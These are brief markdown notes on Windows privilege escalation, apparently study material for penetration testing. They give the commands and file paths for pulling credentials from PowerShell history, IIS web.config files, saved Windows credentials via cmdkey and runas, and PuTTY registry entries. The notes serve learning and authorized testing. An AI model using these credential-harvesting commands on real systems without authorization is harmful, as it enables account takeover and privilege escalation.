# 4 privEsc (windows)

## Powershell history

The powershell history can be found at 

```
$ENV:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## IIS configuration

IIS (Internet Information Services) is a web server software created by Microsoft for use with the Windows NT family.
The configuration of websites on IIS is stored in a file named `web.config` and can store credentials.
The file can be found at one of these locations

```
C:\inetpub\wwwroot\web.config
```
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

## Saved windows credentials

Windows allows you to use other user's credentials. The command below will list the saved user credentials on the system.

```
cmdkey /list
```
You can try to use these by running

```
runas /savecred /user:username cmd.exe
```

## Putty credentials

You can retrieve the stored proxy credentials by running

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

